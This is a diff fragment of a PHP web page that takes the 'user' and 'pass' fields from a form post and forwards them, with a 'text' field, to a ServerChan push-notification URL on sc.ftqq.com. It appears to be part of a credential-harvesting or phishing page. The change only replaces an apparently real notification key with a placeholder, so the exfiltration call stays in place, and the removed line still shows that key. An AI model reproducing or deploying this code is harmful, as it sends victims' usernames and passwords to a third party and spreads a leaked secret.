@@ -41,7 +41,7 @@ input{margin-top: 3px;}
 
 $text=$_POST["text"];
 $desp=$_POST["user"].$_POST["pass"];
-file_get_contents("https://sc.ftqq.com/SCU2940Ta84736c9dae441346197e5fee93d01b057f907157a921.send?text={$text}&desp={$desp}");
+file_get_contents("https://sc.ftqq.com/你的server酱?text={$text}&desp={$desp}");
 ?>
 <span style="color: purple;">
 <?php
